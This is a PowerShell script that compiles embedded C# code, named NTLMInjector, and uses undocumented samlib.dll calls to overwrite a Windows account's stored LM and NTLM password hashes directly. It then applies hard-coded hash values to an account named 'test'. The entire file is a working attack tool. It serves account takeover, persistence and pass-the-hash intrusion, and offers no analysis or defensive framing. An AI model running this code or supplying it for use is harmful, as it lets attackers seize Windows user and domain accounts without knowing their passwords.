$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;


namespace NTLMInjector
{
	public class NTLMInjector
	{
		[DllImport("samlib.dll")]
		static extern int SamConnect(ref UNICODE_STRING serverName, out IntPtr ServerHandle, int DesiredAccess, bool reserved);

		[DllImport("samlib.dll")]
		static extern int SamConnect(IntPtr server, out IntPtr ServerHandle, int DesiredAccess, bool reserved);

		[DllImport("samlib.dll")]
		static extern int SamCloseHandle(IntPtr SamHandle);

		[DllImport("samlib.dll")]
		static extern int SamOpenDomain(IntPtr ServerHandle, int DesiredAccess, byte[] DomainId, out IntPtr DomainHandle);
		
		[DllImport("samlib.dll")]
		static extern int SamOpenUser(IntPtr DomainHandle, int DesiredAccess, int UserId, out IntPtr UserHandle);

		struct SAMPR_USER_INTERNAL1_INFORMATION
		{
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public byte[] EncryptedNtOwfPassword;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public byte[] EncryptedLmOwfPassword;
			public byte NtPasswordPresent;
			public byte LmPasswordPresent;
			public byte PasswordExpired;
		}

		[DllImport("samlib.dll")]
		static extern int SamSetInformationUser(IntPtr UserHandle, int UserInformationClass, ref SAMPR_USER_INTERNAL1_INFORMATION Buffer);

		const int MAXIMUM_ALLOWED = 0x02000000;
		const int UserInternal1Information = 18;

		[StructLayout(LayoutKind.Sequential)]
		struct UNICODE_STRING : IDisposable
		{
			public ushort Length;
			public ushort MaximumLength;
			private IntPtr buffer;

			[SecurityPermission(SecurityAction.LinkDemand)]
			public void Initialize(string s)
			{
				Length = (ushort)(s.Length * 2);
				MaximumLength = (ushort)(Length + 2);
				buffer = Marshal.StringToHGlobalUni(s);
			}

			public void Dispose()
			{
				if (buffer != IntPtr.Zero)
					Marshal.FreeHGlobal(buffer);
				buffer = IntPtr.Zero;
			}
			public override string ToString()
			{
				if (Length == 0)
					return String.Empty;
				return Marshal.PtrToStringUni(buffer, Length / 2);
			}
		}

		static int GetRidFromSid(SecurityIdentifier sid)
		{
			string sidstring = sid.Value;
			int pos = sidstring.LastIndexOf('-');
			string rid = sidstring.Substring(pos + 1);
			return int.Parse(rid);
		}

		[SecurityPermission(SecurityAction.Demand)]
		public static int SetNTLM(string server, SecurityIdentifier account, byte[] lm, byte[] ntlm)
		{
			IntPtr SamHandle = IntPtr.Zero;
			IntPtr DomainHandle = IntPtr.Zero;
			IntPtr UserHandle = IntPtr.Zero;
			int Status = 0;
			UNICODE_STRING ustr_server = new UNICODE_STRING();
			try
			{
				if (String.IsNullOrEmpty(server))
				{
					Status = SamConnect(IntPtr.Zero, out SamHandle, MAXIMUM_ALLOWED, false);
				}
				else
				{
					ustr_server.Initialize(server);
					Status = SamConnect(ref ustr_server, out SamHandle, MAXIMUM_ALLOWED, false);
				}
				if (Status != 0)
				{
					Console.WriteLine("SamrConnect failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamConnect OK");
				byte[] sid = new byte[SecurityIdentifier.MaxBinaryLength];
				account.AccountDomainSid.GetBinaryForm(sid, 0);
				Status = SamOpenDomain(SamHandle, MAXIMUM_ALLOWED, sid, out DomainHandle);
				if (Status != 0)
				{
					Console.WriteLine("SamrOpenDomain failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamrOpenDomain OK");
				int rid = GetRidFromSid(account);
				Console.WriteLine("rid is " + rid);
				Status = SamOpenUser(DomainHandle , MAXIMUM_ALLOWED , rid , out UserHandle);
				if (Status != 0)
				{
					Console.WriteLine("SamrOpenUser failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamOpenUser OK");
				SAMPR_USER_INTERNAL1_INFORMATION information = new SAMPR_USER_INTERNAL1_INFORMATION();
				information.EncryptedLmOwfPassword = lm;
				information.LmPasswordPresent = (byte) (lm == null ? 0 : 1);
				information.EncryptedNtOwfPassword = ntlm;
				information.NtPasswordPresent = (byte)(ntlm == null ? 0 : 1);
				information.PasswordExpired = 0;
				Status = SamSetInformationUser(UserHandle, UserInternal1Information, ref information);
				if (Status != 0)
				{
					Console.WriteLine("SamSetInformationUser failed {0}", Status.ToString("x"));
					return Status;
				}
				Console.WriteLine("SamSetInformationUser OK");
			}
			finally
			{
				if (UserHandle != IntPtr.Zero)
					SamCloseHandle(UserHandle);
				if (DomainHandle != IntPtr.Zero)
					SamCloseHandle(DomainHandle);
				if (SamHandle != IntPtr.Zero)
					SamCloseHandle(SamHandle);
				ustr_server.Dispose();
			}
			Console.WriteLine("OK");
			return 0;
		}
	}

}

"@
Add-Type -TypeDefinition $Source

[System.Security.Principal.NTAccount]$objUser = New-Object System.Security.Principal.NTAccount("test", "test")
[System.Security.Principal.SecurityIdentifier] $objSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]) 

[Byte[]] $lm = 0x88, 0x8D, 0xA5, 0xEA, 0xEC, 0x83, 0xF2, 0x56, 0xAA, 0xD3, 0xB4, 0x35, 0xB5, 0x14, 0x04, 0xEE
[Byte[]] $ntlm =  0x4A, 0x4E, 0x27, 0xFB, 0x69, 0xE0, 0x63, 0x40, 0x9B, 0x94, 0xEB, 0xDE, 0x20, 0x23, 0xF9, 0xB7

[NTLMInjector.NTLMInjector]::SetNTLM($null, $objSID, $lm, $ntlm)
